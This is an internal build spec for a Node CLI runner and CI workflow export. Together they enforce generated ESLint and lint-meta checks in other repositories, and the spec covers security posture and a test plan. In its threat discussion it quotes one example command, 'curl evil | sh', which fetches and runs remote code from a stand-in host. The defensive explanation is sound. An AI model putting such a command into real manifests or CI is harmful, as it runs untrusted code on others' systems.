# Build spec: portable lock (Structure-Lock as a portable artifact)

**Date:** 2026-07-11
**Wayfinder issue:** #92 — *Spec portable Structure-Lock export* (CLOSED, grilled 2026-07-10).
**Status:** build-ready. Every decision in § 1 is locked (user-grilled 2026-07-10, recorded
verbatim). Do NOT re-litigate; implement. § 0 flags where the locked decisions no longer match
shipped code — read it before building.
**Source (opportunity 3, the distribution wedge):**
`docs/research/2026-07-10-competitive-landscape.md:182-185` +
`docs/research/2026-07-10-nightcore-roadmap.md:93-95` (item 9, "LATER (3+ months)").
**Architecture prior art (read for the idioms this clones):**
- The Rust runner this ports — `apps/desktop/src-tauri/src/workflow/gauntlet_project/{config,runner}.rs`
  (the loader + sequential stop-at-first command spawner; **the npx runner is a faithful port of
  these two files** — behavior parity is the target and their tests are the fixtures to mirror).
- The security-critical write path this must NOT touch — `apps/desktop/src-tauri/src/sidecar/harness/apply.rs`.
- The manifest seam — `apps/desktop/src-tauri/src/store/harness_manifest.rs`.
- The lint-meta engine this partially ports — `tools/lint-meta/{cli.ts,types.ts,registry.ts,baseline.ts}`.
- The export-command + results-bar-button idiom — `write_trust_report` (Trust Report, #91) and
  `ui/IssueMapExportButton` (mounted at `harness/HarnessView/HarnessView.tsx:204`).

> An implementer with no session context can build **PR 1** directly from § 9 — it is fully
> testable headless against fixture `.nightcore/harness.json` dirs, no network, no Nightcore.
> PR 2 extends PR 1's CLI. PR 3 (Rust export) and PR 4 (npm publish) depend on the package
> existing. Each PR is independently green against the full gate battery (§ 8).

---

## 0. CORRECTIONS — where the locked decisions no longer match shipped code

The harness/ENFORCE surface moved substantially between the 2026-07-10 grill and today. The
decisions in § 1 are still authoritative for **product intent**, but three assumptions embedded
in the resolution are now stale. Build against the code, not the assumption.

**FLAG A — "Gauntlet check definitions (ast-grep etc.) are deferred from v1 — they join once the
runner can execute them" is based on a false premise.** The Nightcore in-process gauntlet
**already executes all nine check kinds, ast-grep included**, and has since 2026-07-02 (a week
*before* the grill): `gauntlet_project/config.rs:18-58` enumerates `lint-plugin`,
`dependency-cruiser`, `coverage-threshold`, `lockfile-lint`, `env-contract`, `secret-scan`,
`mutation-score`, `ast-grep`, `api-extractor`; the runner (`runner.rs:53-56`) is a **generic
command spawner** that splits `command` on whitespace and runs it — it does not special-case any
kind. ast-grep runs exactly like `npx eslint .`. Commits: `71a111b3` (ast-grep + api-extractor),
`d17305b1` (the four hardening kinds), `fd23967c` (catalog complete). **The real v1 deferral is
not a runner-capability gap — it is target-CI toolchain availability** (see § 3.5): a target repo
almost always already has ESLint, but ast-grep / stryker / api-extractor / gitleaks are extra CI
installs. v1 exports the checks whose toolchain the target already has (ESLint) plus the runner's
own bundled lint-meta engine; heavier-toolchain checks travel in the manifest but are opt-in.

**FLAG B — the stage nav is FIVE stages now, not three.** The roadmap's "Understand/Harden/Enforce"
is outdated: `apps/web/src/components/app/AppShell/nav.constants.tsx:15-22` documents
**Intake → Understand → Harden → Enforce → Verify** (five-stage flip `44d9fd7b`, 2026-07-10). The
harden/enforce split is a **pure view filter over the one harness run/store**, not a new store
(`harness/harness-sections.ts`). The Enforce stage (`HarnessView mode="enforce"`) shows
**conventions + policy + the gauntlet-arm affordance** (`harness-sections.ts` `SECTIONS_BY_MODE`).
The portable-lock export button (PR 3) mounts on the **Enforce** results bar, beside the existing
`IssueMapExportButton` (`HarnessView/HarnessView.tsx:204`).

**FLAG C — do not collide with the already-shipped "Export to GitHub" button.** There is already
an `IssueMapExportButton scanKind="enforce"` on the Enforce results bar (`02c3a4a3`, 2026-07-11).
It exports **conventions as a GitHub issue map** — a completely different feature. The portable
lock is a *second, separate* export affordance. "ENFORCE-lite coverage" (`RuleCoverageGap` /
`CoverageStatus`, `a266fc26`+) is has-a-rule **coverage**, not conformance/drift — its `enforced`
status already counts "an armed gauntlet check" (`harness.constants.ts`), so the coverage panel
and the portable lock share the same underlying `.nightcore/harness.json` `checks[]`.

**FLAG D — most of the `policy` block is meaningless in plain CI.** The manifest's `policy` block
(`deny_bash_patterns`, `ask_tools`, `allow_tools`, `disallowed_tools`) is enforced ONLY by
Nightcore's in-process PreToolUse agent gate (`store/harness_policy.rs`) — it governs a *running
agent*, and has no meaning to a CI runner that isn't driving an agent. Only a small subset is
CI-checkable (`diffBudget`, `protected_paths` — both need a base ref, which CI has). The bundle
still carries the whole `policy` block (for Nightcore-driven consumers and as documentation), but
the runner enforces `checks[]` and, at most, the CI-meaningful policy subset (§ 3.6). Do not
promise CI enforcement of the agent-runtime tiers.

---

## 1. Decision record (grilled 2026-07-10 — recorded verbatim from issue #92, do not reopen)

| # | Decision | Outcome (verbatim) |
|---|---|---|
| 1 | **Bundle contents** | The generated ESLint plugin + lint-meta rules, AGENTS.md/CLAUDE.md agent guidance, and the HarnessPolicy manifest. **Gauntlet check definitions (ast-grep etc.) are deferred from v1 — they join once the runner can execute them.** *(See FLAG A — reframed as a toolchain, not a runner, concern.)* |
| 2 | **Primary consumer** | **CI job** — export lands as a ready-to-commit workflow + config that reds the build on violations, so the harness governs teammates who never open Nightcore. |
| 3 | **CLI shim** | **YES — a thin published runner** (e.g. `npx @nightcore/harness check`) that executes the bundle's checks anywhere. Deviates from the files-only recommendation; accepted cost: a published package + release pipeline to maintain. This also gives the deferred gauntlet-check defs their future execution vehicle. |
| 4 | **Ownership** | **Downstream-owned.** Export is a one-time scaffold; the target repo edits freely; re-export produces a reviewable diff/PR — never a silent overwrite, matching the hardened `apply_harness_artifact` philosophy. |
| 5 | **Roadmap slot** | **Later tier** (after Trust Report), per adoption-first ordering. The thin-runner decision adds a **"publish pipeline" prerequisite** that the implementation spec must include. |

**Hard constraints (carried from the decisions + the security review, do not violate):**
- **`apply_harness_artifact` and `apply.rs` are frozen.** The export writer is NEW and SEPARATE
  (§ 3.4); it never routes through, weakens, reorders, or "tidies" the security-critical apply path.
- **The runner runs in OTHER people's CI.** Supply-chain posture is non-negotiable (§ 5): pinned /
  ideally zero runtime deps, no network at run time, no telemetry, no eval of repo-controlled config
  beyond the declared artifact files. The runner is **not** an integrity/attestation scheme (§ 2).
- **Downstream-owned means the runner enforces what is PRESENT.** It never checks that the committed
  artifacts match what Nightcore generated. Re-export shows drift as a git diff; there is no
  cryptographic guarantee (§ 5, stated honestly).

---

## 2. What this is (and is NOT)

The portable lock packages the harness artifacts a target repo already owns — the generated ESLint
plugin (`eslint-plugin-file`/`eslint-rule`/`eslint-config` artifacts, plain `.js`), the lint-meta
rules (`lint-meta-rule` artifacts), the agent docs (`agent-contract`, i.e. CLAUDE.md/AGENTS.md),
and the `.nightcore/harness.json` manifest — plus the two missing pieces for standalone
enforcement: a **thin published `npx` runner** (`@nightcore/harness`) and a **generated CI workflow**
that invokes it. A teammate who never opened Nightcore does `git pull`, and CI runs
`npx @nightcore/harness check`, which reads `.nightcore/harness.json` and runs each declared check
(`npx eslint .` against the committed plugin; `npx @nightcore/harness lint-meta` against the
committed rules), reddening the build on any violation. No Nightcore install, no server, no account.

It is **NOT**:

- **a SaaS** — no server, no hosted anything, no accounts. The runner is a self-contained npm CLI;
  everything it needs is committed in the target repo.
- **telemetry** — the runner makes **zero network calls at run time** (§ 5). No analytics, no
  phone-home, no fetching rules from a registry. Data never leaves the target's CI.
- **an integrity / attestation scheme** — it does **not** verify that the committed ESLint plugin /
  lint-meta rules / manifest match what Nightcore originally generated. The artifacts are
  downstream-owned (decision 4): the target may edit or delete them freely, and the runner enforces
  **whatever is present**. A weakened rule is enforced in its weakened form. Re-export surfaces drift
  as a reviewable diff (PR review is the control), but there is no signature or hash check. Stated
  honestly so no one mistakes the runner for a supply-chain integrity guarantee about the *rules*.
  (The runner *package itself* ships with npm provenance — § 5 — but that attests the package, not
  the target's rules.)
- **required for Nightcore-driven projects** — those already enforce the structure lock via the
  in-process `gauntlet_project` runner at review/merge (`runner.rs:28-108`). The portable lock is
  purely for enforcing the lock **outside** Nightcore (plain CI, a teammate's editor, Claude Code).
- **a policy-runtime engine** — the agent PreToolUse policy tiers (deny/ask/allow bash patterns,
  tool gates) have no meaning in CI (FLAG D). The runner enforces executable `checks[]`, and at
  most the CI-meaningful policy subset (`diffBudget`, `protected_paths`).

---

## 3. Design — tier by tier

### 3.0 The seam that makes this tractable: the runner already exists, in Rust

`.nightcore/harness.json` `checks[]` already stores **executable check commands**, and
`gauntlet_project` already runs them. The whole runner design is: **port `config.rs` + `runner.rs`
to a standalone Node CLI.** The behavior is fully specified by existing, tested Rust:

- `config.rs:60-82` — `HarnessCheckConfig { name, kind, command?, configPath?, enabled=true }`,
  parsed leniently (per-entry warn-and-skip).
- `config.rs:102-143` `load_checks(dir)` — read `.nightcore/harness.json`, take the `checks` array,
  drop disabled / command-less entries. Every skip path (absent file, malformed JSON, no `checks`
  array) yields an empty list ⇒ the gate trivially passes (opt-in-by-presence).
- `config.rs:149-164` `plan_check` — split `command` on whitespace into program + args.
- `runner.rs:28-108` `run_from(manifest_root, run_dir)` — run each planned check sequentially in
  `run_dir`, **stop at the first non-zero exit**, capture tail output on failure, produce
  `StructureLockResult { passed, checks[], failed_check }`.
- `runner.rs:191-210` `fix_instruction` — the human-readable "check X failed; run `<command>`; here
  is the output" message. The runner prints this on failure.

The npx runner reproduces exactly this, minus the Tauri/store coupling. **Parity target:** given
the same `.nightcore/harness.json`, the npx runner and `gauntlet_project::run` reach the same
pass/fail verdict and run the same commands in the same order.

### 3.1 The runner package — `packages/harness/` → `@nightcore/harness`

**Home:** new workspace package `packages/harness/` (peer of `packages/engine`, `packages/eslint-plugin`).
Published name **`@nightcore/harness`** so the shim is `npx @nightcore/harness check` (decision 3).
`bin: { "harness": "./dist/cli.js" }` (scoped package → `npx @nightcore/harness` resolves the
`harness` bin). Shebang `#!/usr/bin/env node`.

**Runtime target: plain Node ≥ 22, npx-runnable, ZERO runtime dependencies.** Node 22 is the repo
floor (`package.json engines.node >=22`) and CI's runtime; **Node 22 ships `fs.globSync` and
`fs.promises.glob`** (verified: `node -e` on the repo's `v22.22.3` returns `function` for both), so
the runner needs **no glob dependency** — it uses `node:fs` (incl. `globSync`), `node:child_process`
(`spawnSync`), `node:path`, `node:process` only. Zero runtime deps is the strongest supply-chain
posture (§ 5) and keeps the npm install a single tarball. (Bun is the monorepo dev/test runtime, but
the *published* artifact must run under plain Node — see § 6 trap b: the current lint-meta `cli.ts`
imports `Glob` from `'bun'`, which is exactly what the port must drop.)

**Build:** clone the `@nightcore/eslint-plugin` packaging shape (the closest-to-publishable package
in the repo, `packages/eslint-plugin/package.json`): `tsup src/cli.ts src/index.ts --format esm,cjs
--dts --clean`, `type: module`, `sideEffects: false`, an `exports` map (for the `index` public types),
a `bin`, a `files: ["dist"]` allowlist, and a `prepublishOnly`/`prepack` build (§ 3.7 / PR 4). Unlike
`packages/engine` (no own build — root `tsc -b`), this package **owns its build** so `npm publish`
ships a real `dist` (§ 6 trap c).

**Files:**
- `src/cli.ts` — arg parsing + subcommand dispatch (`check` [default], `lint-meta`, `--json`,
  `--help`, `--version`). Thin; delegates to the libs.
- `src/manifest.ts` — the port of `config.rs`: read `.nightcore/harness.json`, validate
  `schemaVersion` (§ 3.3), parse `checks[]` leniently, plan program+args. Pure over an injected
  reader for tests.
- `src/run.ts` — the port of `runner.rs`: sequential `spawnSync`, stop-at-first, capture tail,
  build the result + `fix_instruction`. Pure over an injected spawn fn for tests.
- `src/lint-meta/` — the bundled lint-meta engine (PR 2, § 3.5).
- `src/index.ts` — the public types barrel (`IMetaRule`, `IMetaCtx`, `IViolation`, the manifest
  schema type) so generated lint-meta rules can `import type` from `@nightcore/harness`.
- `src/*.test.ts` — headless fixtures (Bun test, enrolled in `test:node`, § 6 trap e).

**`check` behavior (default subcommand):**
1. Resolve the target dir (cwd, or `--dir <path>`). Read `.nightcore/harness.json`.
2. Absent / unreadable / malformed / no-`checks`-array ⇒ **exit 0** ("no structure lock configured
   — nothing to enforce"), byte-parity with `load_checks` returning empty (`config.rs:102-121`).
3. Validate `schemaVersion` (§ 3.3): unknown MAJOR ⇒ **exit non-zero** with "upgrade
   `@nightcore/harness`" (a newer bundle the runner can't safely interpret must NOT silently pass).
4. For each enabled check with a command: print the command (§ 5 — visibility), `spawnSync` it in
   the target dir, inherit stdout/stderr. Stop at the first non-zero exit; mark the rest skipped.
5. On failure: print `fix_instruction` (name + command + tail) and **exit 1**. All pass ⇒ exit 0.
   `--json` emits the `StructureLockResult`-shaped object to stdout instead (for CI annotations).

### 3.2 What a target project already receives (walk the artifact kinds) — and what is MISSING

When a harness proposal is applied today, the target repo receives these **already** (via the frozen
`apply.rs` path — this spec adds nothing to it):

| Artifact kind (`contracts/generated.rs:1109-1119`) | write_mode | Lands as | Runs in CI via |
|---|---|---|---|
| `eslint-plugin-file` | `create` | plain `.js` CommonJS bundle: `index.js` (`module.exports = { rules }`) + `rules/<name>.js` (real AST rules) + `tests/<name>.test.js` (RuleTester) — `engine/…/reference.ts:36-71` | the target's own ESLint, `command: npx eslint .` — **fully portable, no runner code** |
| `eslint-rule` / `eslint-config` | `create` | a flat-config rule / an `eslint.config.js` referencing the local plugin | same |
| `lint-meta-rule` | `create` | a TS `IMetaRule` file + a `registry` + `RULES.md` (`reference.ts:73-91`) — cross-file/non-JS contracts ESLint can't reach | **needs an engine the target does not have** → the runner's `lint-meta` subcommand (§ 3.5, the gap this spec closes) |
| `custom-lint-plugin` | `create` | one README labelling the plugin bundle | (documentation) |
| `agent-contract` | `merge-section` | the guardrail body merged into CLAUDE.md/AGENTS.md's managed block (`apply.rs:20-21,95`) | (agent guidance — no CI check) |
| `tool-config` | `create` | a standalone config (env schema, lockfile-lint config, ast-grep `sgconfig.yml`, …) | the tool named by its check `command` (deferred toolchain, FLAG A) |

The `.nightcore/harness.json` manifest is written separately by `arm_harness_gauntlet_check` →
`write_merge_manifest` (`apply.rs:343`, hard-pinned to `.nightcore/harness.json`, Rust-built entry,
never model output) with `checks[] { name, kind, command, enabled }` and the `policy` block.

**What is MISSING for standalone CI enforcement (this spec supplies all three):**
1. **The runner** (§ 3.1) — the loader/planner/executor exists only as Rust (`gauntlet_project`).
   Nothing a target CI can invoke without Nightcore. → PR 1 (+ PR 2 for lint-meta).
2. **A manifest schema version** — the manifest has **no `version`/`schemaVersion` field** anywhere
   (`store/harness_manifest.rs` writes none; the only `"version"` in the code is a test's "unknown
   key survives round-trip"). A portable format the runner must parse forward-compatibly needs one.
   → PR 3, § 3.3.
3. **A CI workflow + the runner reference** — the "ready-to-commit workflow" (decision 2). → PR 3,
   § 3.4. NB `.github/workflows/` is a **denied write sink** in `apply.rs:45-52`, so this can NOT
   go through the apply path — hence the separate export writer (§ 3.4).

### 3.3 Manifest schema version (additive, serde-default) — PR 3

Introduce a single additive field on the manifest root, at the single manifest seam
(`store/harness_manifest.rs`, audit #35). The manifest is edited as raw `serde_json::Value`
(merge-by-key, unknown keys survive — `harness_manifest.rs:20-26`), so this is a one-line additive
stamp, not a struct rewrite:

```jsonc
// .nightcore/harness.json
{
  "schemaVersion": 1,           // NEW — stamped by the exporter; absent ⇒ treated as 1 by the runner
  "checks": [ { "name", "kind", "command", "enabled" } ],
  "policy": { … }
}
```

- The exporter (§ 3.4) stamps `schemaVersion: 1` when it writes the export bundle's manifest copy.
  (It may also stamp the live `.nightcore/harness.json` on export — additive, harmless to the
  in-process gauntlet which reads only `checks`/`policy`.)
- The runner treats **absent as `1`** (a manifest armed before this feature is a valid v1 bundle),
  passes any equal-or-lower MINOR, and **fails on an unknown MAJOR** (a bundle authored by a newer
  Nightcore the runner can't safely interpret must red the build, not silently pass — the fail-safe
  direction). This is the only piece of the manifest the runner interprets *structurally*; the rest
  it treats as data.
- **Do not add `schemaVersion` to `HarnessCheckKind` gating or the arm allowlist** — it is a
  root-level format stamp, orthogonal to the check vocabulary.

### 3.4 The export writer — `sidecar/harness/export.rs` (NEW, separate from apply.rs) — PR 3

A dedicated, hardened, **Rust-templated** export writer. It is NOT `apply.rs` and does not call it.
The content it writes is **deterministic Rust template output, never model output** — the same trust
basis as `write_merge_manifest`'s Rust-built check entry (`apply.rs:333-360`) — so the injection
threat the `apply.rs` denylist defends against does not apply to it.

**It writes a staging bundle under `.nightcore/export/portable-lock/`** (a contained,
non-execution-sink path — safe under the same containment rules, and NOT one of the denied sinks):
- `harness.json` — a copy of the live manifest, stamped `schemaVersion` (§ 3.3).
- `nightcore-lock.yml` — the CI workflow template (below).
- `README.md` — install + commit instructions, including the ONE manual step.

**Why staging + a manual step for the workflow, not an auto-write into `.github/workflows/`:**
`.github/workflows/` is a denied execution sink (`apply.rs:45-52`) precisely because a file there
auto-runs on the next push. Even though the export content is Rust-templated (not model output), the
security posture is "a CI workflow is human-committed, never tool-placed." So the exporter writes the
workflow to the staging dir and the README instructs the user to **copy `nightcore-lock.yml` into
`.github/workflows/` themselves** and commit it. Re-export overwrites the staging dir only
(reviewable via `git diff`) — it never touches live `.github/workflows/` (decision 4: reviewable
diff, never silent overwrite). This keeps the "never auto-write a CI sink" invariant intact WITHOUT
weakening `apply.rs`.

**The `nightcore-lock.yml` template (deterministic):**
```yaml
# Generated by Nightcore — portable Structure-Lock. Commit into .github/workflows/.
name: structure-lock
on: [push, pull_request]
jobs:
  structure-lock:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: '22' }
      # PINNED version (§ 5 supply-chain) — matches the runner published in PR 4.
      - run: npx --yes @nightcore/harness@<PINNED> check
```
The `<PINNED>` version is a Rust const kept in lockstep with the published runner version (PR 4).
Pinned, never `@latest` (§ 5). Node 22 to match the runner floor and the repo.

**Command:** `export_portable_lock(project_path) -> PortableLockExport` — async +
`spawn_blocking` (a sync `#[tauri::command]` freezes the WKWebView — the known trap,
`reference_tauri_command_threading`; every write-bearing harness command already does this,
`commands.rs:227-238`). Returns the staging path + the workflow text (so the UI can offer copy) +
the list of files written + the pinned runner version. `PortableLockExport` is a Rust-authored
ts-rs type (§ 5 codegen lockstep). Registered in `lib.rs`'s `generate_handler!` in the harness
group.

**Web (Enforce stage, FLAG B):** an "Export portable lock" affordance on the Enforce results bar,
beside `IssueMapExportButton` (`HarnessView/HarnessView.tsx:204`; the Enforce sections are
conventions + policy per `harness-sections.ts` `SECTIONS_BY_MODE`). Model it on the existing
`ui/IssueMapExportButton` folder-per-component shape (its own `.tsx/.hooks.ts/.types.ts/.test.tsx/
.stories.tsx/index.ts`, `ui/IssueMapExportButton/`): a button → a preview/confirm dialog showing
what will be written + the workflow YAML with a copy button + the "copy into .github/workflows/"
instruction. Bridge wrapper in `lib/bridge/commands/` cloning the trust-report export wrapper.

### 3.5 The lint-meta subcommand — the portable engine — PR 2

The `eslint-plugin-file` path is portable with zero runner code (the target's own ESLint loads the
committed `.js` plugin). The `lint-meta-rule` path is **not**: those rules need the lint-meta engine,
which lives only in `tools/lint-meta/` and is **Bun-coupled** (`cli.ts:10` imports `Glob` from
`'bun'`; `cli.ts:18` uses `import.meta.dir`). PR 2 ports the **portable half** of that engine into
the runner as `npx @nightcore/harness lint-meta`.

- **Port the engine, not the 21 rules.** The `tools/lint-meta` rules encode *Nightcore's own*
  structure (`package-shape.ts` hardcodes `@nightcore/*`; the `rust-*` rules encode Nightcore's
  tiers; three rules shell out to `bun run tools/…`). They are NOT reusable in a foreign repo. What
  ports is the **engine**: the `IMetaCtx`/`IMetaRule`/`IViolation` contract (`types.ts:9-42`), the
  run loop + reporting + exit code (`cli.ts:69-90`), and the ratchet/baseline mechanism
  (`baseline.ts`). The **rules the runner runs are the target's own generated `lint-meta-rule`
  artifacts.**
- **Node `IMetaCtx`.** Reproduce the ctx (`cli.ts:22-45`) on plain Node: `read` via `node:fs` +
  LF-normalization, `exists` via `node:fs`, **`glob` via `fs.globSync`** (replacing the Bun `Glob`),
  `exec` via `node:child_process` `spawnSync` (never throws). `createFakeCtx`
  (`tools/lint-meta/tests/test-utils/createFakeCtx.ts`) proves the rules are ctx-injectable — clone
  its in-memory ctx for the runner's tests.
- **Publish the contract.** Export `IMetaRule`/`IMetaCtx`/`IViolation` from `@nightcore/harness`
  (`src/index.ts`) so the exporter can generate rules that `import type { IMetaRule } from
  '@nightcore/harness'` — the generated rules target the *portable* engine's contract, not
  `tools/lint-meta/types.ts`. (Requires a synthesis-prompt tweak so `lint-meta-rule` artifacts
  import from the published package; note it in PR 2 but the synthesis change is small and additive.)
- **Bounded eval (§ 5).** The subcommand loads ONLY the rule registry the manifest/bundle enumerates
  (a fixed path, e.g. `.nightcore/lint-meta/registry.js`), imports it, and runs each rule's
  `run(ctx)`. It does NOT scan-and-import arbitrary files. Exit 1 on any `ciCritical` violation
  (`cli.ts:90` semantics), print each violation as `[ERROR] <rule> (<file>): <message>`.
- **Wiring:** the manifest arms a `lint-meta` check with `command: npx @nightcore/harness lint-meta`.
  This requires adding `lint-meta` to the two lockstep vocabularies — `HarnessCheckKind`
  (`config.rs:18-58`) and `ARMABLE_CHECK_KINDS` (`commands.rs:37-47`) — a small additive Rust change
  bundled into PR 2 (or PR 3). Until then, lint-meta rules travel as files but aren't armed.

**PR 2 is the deferrable slice.** If lint-meta enforcement is descoped from a first cut, PR 1 (the
`check` runner) + PR 3 (export) + PR 4 (publish) already deliver the ESLint-plugin portable lock end
to end — the 80% of the wedge. PR 2 makes the "lint-meta rules" half of the bundle (decision 1)
actually enforce, and is the clean fast-follow.

### 3.6 Policy in CI (honest scope — FLAG D)

The runner enforces `checks[]`. The `policy` block travels in the exported bundle (decision 1) but:
- `deny_bash_patterns` / `ask_tools` / `allow_tools` / `disallowed_tools` — **agent-runtime only**
  (`store/harness_policy.rs`). No CI meaning. Exported as documentation / for Nightcore consumers.
- `diffBudget { maxChangedLines, maxChangedFiles }` (`harness_manifest.rs:46-53`) and
  `protected_paths` — **CI-checkable** given a base ref (which `pull_request` CI provides). An
  optional runner check (`npx @nightcore/harness policy --base <ref>` computing `git diff --numstat`)
  could enforce these. **Out of v1** (§ 10) — named so it is not silently assumed. v1 exports the
  policy block as data and enforces only `checks[]`.

---

## 4. Manifest / settings evolution (serde-additive)

The only schema change is the additive `schemaVersion` root stamp (§ 3.3), written through the
single manifest seam (`store/harness_manifest.rs`, merge-by-key over raw `Value` — additive,
unknown keys already survive, `harness_manifest.rs:403-448` tests). No `Settings` struct field is
added: the export is a per-project, on-demand action (like the Trust Report / IssueMap exports),
not a global preference. No new `AppView` (the export lives on the existing Enforce stage, FLAG B).

---

## 5. Security posture — the runner executes in OTHER people's CI

This is the load-bearing section. The runner is an npm package thousands of foreign CI jobs may run.

**Supply-chain (the runner PACKAGE):**
- **Zero runtime dependencies** (§ 3.1) — pure `node:*` builtins (Node 22 `fs.globSync` removes the
  only dep temptation). No transitive surface to audit, nothing to pin because there is nothing to
  depend on. If a dep ever becomes unavoidable, it is pinned to an exact version (no `^`/`~`) and
  justified in the PR.
- **No network at run time** — the runner never fetches anything: not rules, not config, not
  updates, not analytics. Everything it reads is committed in the target repo. (This is testable:
  a test asserts no `http`/`https`/`net`/`dns`/`fetch` import in the shipped `dist`.)
- **npm provenance on publish** (PR 4) — `npm publish --provenance` + `id-token: write`, so
  consumers get a verifiable build-provenance attestation for `@nightcore/harness` itself. (This
  attests the *package*, NOT the target's rules — see the honest caveat below.)
- **The exported CI workflow pins the runner version** (`@nightcore/harness@<PINNED>`, § 3.4), never
  `@latest` — a target's CI is reproducible and a compromised future publish can't silently reach
  already-scaffolded repos.

**No eval of repo-controlled config beyond the declared artifact files:**
- The manifest is **JSON only** — the runner never loads or evals a `.nightcore/harness.js` (or any
  executable config). A malicious repo can't get code execution via the *config format*; only via a
  declared `command` (below).
- The `lint-meta` subcommand imports **only the enumerated registry** from a fixed path (§ 3.5) —
  it never scan-and-imports arbitrary `.js`. The eval surface is exactly the declared rule files.

**The `command` strings ARE executed — framed honestly:**
- `check` runs the `command` strings from `.nightcore/harness.json`. These are repo-controlled. In a
  target repo's OWN CI this is the same trust level as any `package.json` script or
  `.github/workflows` step — the repo's own committed, PR-reviewed config. The runner is not a
  privilege escalation over what the target's CI can already do.
- **Legibility as the control:** the runner **prints every command before running it** (§ 3.1), so a
  reviewer reading CI logs (or the runner's `--json`) sees exactly what executed. Combined with the
  target's own PR review + branch protection, a `command: curl evil | sh` slipped into
  `.nightcore/harness.json` is caught in review — the same defense any CI file relies on. The runner
  adds no *new* trust assumption; it does not, and cannot, sandbox a repo from its own committed
  commands.

**Artifact tampering in the target repo (downstream-owned, decision 4):**
- The target OWNS and may edit the ESLint plugin, the lint-meta rules, and the manifest. The runner
  **enforces what is present** — if someone weakens a rule or deletes a check, the runner enforces
  the weakened/reduced set. This is by design (downstream-owned), not a hole.
- **The runner is explicitly NOT an integrity attestation.** It does not hash/sign-check the
  committed artifacts against Nightcore's original output. There is no "these rules are unmodified"
  guarantee. The control against silent weakening is **PR review of the diff** (re-export produces a
  reviewable diff; a hand-edit shows up in `git diff`), not cryptography. This is stated plainly in
  the exported README so no consumer over-trusts the runner.

**Codegen / lint lockstep (PR 3):**
| Concern | File | Action |
|---|---|---|
| ts-rs export of `PortableLockExport` | `bindings/export.rs` (beside the `TrustReport` cluster) | register; `cargo test` (from `apps/desktop/src-tauri`) regenerates `apps/web/src/lib/generated/*`. Never hand-edit. |
| Command registration | `lib.rs` `generate_handler!` | add `export_portable_lock` to the harness group. |
| `schemaVersion` stamp | `store/harness_manifest.rs` | additive root key via the existing merge-by-key writer. |
| `lint-meta` armable kind (PR 2) | `config.rs:18-58` + `commands.rs:37-47` | add `LintMeta`/`"lint-meta"` to BOTH in lockstep (arm allowlist + runnable enum) or an armed check silently warn-skips. |

---

## 6. Repo-specific traps (mandatory — each has bitten this codebase or is provable here)

**(a) worktree bootstrap.** A fresh worktree's `node_modules` symlinks point at MAIN's packages;
`bun install` in the worktree before building/testing the new package
(`reference_desktop_build_gotchas`). The new `packages/harness` won't resolve otherwise.

**(b) the published runner must NOT depend on Bun.** The monorepo runs on Bun, but `npx
@nightcore/harness` runs under plain Node in a stranger's CI. The current lint-meta engine imports
`Glob` from `'bun'` (`cli.ts:10`) and uses `import.meta.dir` (`cli.ts:18`) — the port MUST drop both
(use `fs.globSync` + `import.meta.dirname`/`node:path`). Tests should run the CLI under **`node`,
not `bun`**, at least in one gate, to catch a stray Bun-ism. Zero runtime deps (§ 3.1) is what makes
this clean.

**(c) own the build so `npm publish` ships `dist`.** `packages/engine` has NO build script (root
`tsc -b` builds it) yet points `exports` at `./dist` — a naive `npm publish` from a clean checkout
would ship nothing. `dist/` is gitignored repo-wide (as in `packages/eslint-plugin`). So the runner
package MUST have its own `tsup` build + a `prepublishOnly`/`prepack` hook + a `files: ["dist"]`
allowlist, or the tarball is empty. Verify with `npm pack --dry-run` (PR 4).

**(d) ts-rs regen is regenerate-and-commit, from `src-tauri`.** `PortableLockExport` exports only
during `cargo test` run **from `apps/desktop/src-tauri`** (root `cargo` no-ops — no root
`Cargo.toml`). Register in `bindings/export.rs`, `cargo test`, and **commit** the regenerated
`apps/web/src/lib/generated/*` + `bindings/*`. A missing registration or uncommitted regen reds the
CI drift guard. `cargo fmt --all --check` also silently no-ops from the repo root — run it from
`apps/desktop/src-tauri`.

**(e) `test:node` enrollment + lint-meta parity rules fire on a NEW package.** Adding
`packages/harness` trips several `tools/lint-meta` rules (`bun run lint:meta`):
`package-shape` (the package.json must match the `@nightcore/*` shape),
`workspace-graph-parity` (root workspace graph), `test-workspace-enrollment` (the package's tests
must be listed in a test script), `test-runner-segregation` (Bun-test vs vitest placement).
**Add `packages/harness` to the `test:node` list** (`package.json:30`) so its tests run and it
passes enrollment. Validate `bun run lint:meta` = zero on a clean tree after adding the package.

**(f) folder-per-component on the export button (PR 3 web).** The Enforce-stage export button must
pass the `@nightcore/eslint-plugin` folder / thin-shell / hook-budget / no-cross-feature-import
gates (`bun run lint`). Model it on `ui/IssueMapExportButton/` (a `ui/` primitive, six files).
**Do NOT add a new `nightcore/*` ESLint rule** — the `agent-contract-parity` lint-meta rule fails
`bun run lint` if a wired rule isn't named in some `AGENTS.md`. None is needed here.

**(g) 400-line file-size ratchet.** `apps/web/src` files are ratcheted at 400 lines
(`web-file-size-ratchet`, a lint-meta baseline rule). Keep the export button + dialog under it
(folder-per-component naturally does); do not freeze new files into the baseline.

**(h) PR labels + no AI attribution.** Commit to `main` with small conventional commits; **no
co-author / AI-attribution trailers** (`feedback_nightcore_workflow`). Wayfinder issues carry the
tracking label; leave PR labels as the repo convention dictates. This spec doc is NOT committed by
the spec task.

**(i) do not touch `apply.rs`.** The export writer is new and separate (§ 3.4). Any change to
`apply.rs`, its denylists, or its writers is out of scope and a review-blocker — the CI-sink denial
of `.github/workflows/` is exactly what forces the staging-dir + manual-copy design, and must stay.

---

## 7. Test plan (headless where possible; clone the named idioms)

**PR 1 — runner `check` (Bun/Node tests in `packages/harness`, enrolled in `test:node`):**
1. **Parity fixtures.** For each `gauntlet_project` behavior, a fixture `.nightcore/harness.json` +
   assert the runner matches: a passing check (`node -e "process.exit(0)"`) ⇒ exit 0; a failing
   check ⇒ exit 1 + `fix_instruction` printed; two checks, first fails ⇒ second reported skipped
   (stop-at-first, `runner.rs:37-99`); a disabled check ⇒ skipped; absent manifest ⇒ exit 0;
   malformed JSON ⇒ exit 0 (warn-skip, `config.rs:111-121`); no `checks` array ⇒ exit 0.
2. **Command planning.** `command` split on whitespace into program+args (`plan_check`); a
   command-less/blank entry ⇒ skipped.
3. **schemaVersion gate.** Absent ⇒ treated as v1 (pass); a higher MAJOR ⇒ exit non-zero with the
   upgrade message.
4. **`--json`** emits a `StructureLockResult`-shaped object; verdict matches the human path.
